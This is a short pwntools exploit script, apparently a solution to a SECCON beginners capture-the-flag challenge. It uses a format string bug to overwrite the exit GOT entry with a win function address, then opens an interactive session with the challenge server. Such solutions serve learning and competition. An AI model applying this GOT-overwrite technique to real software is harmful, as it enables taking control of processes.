from pwn import *

exe = ELF('./chall')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+396
        continue
    """)
elif args.REMOTE:
    io = remote("pure-and-easy.beginners.seccon.games", 9000)


# io.sendline(b'AAA%p-' * 10)


offset = 6
exit_got = 0x404040
win = 0x401341
payload = fmtstr_payload(offset, {exit_got: win}, write_size='byte')

io.sendlineafter(b'>', payload)

io.interactive()
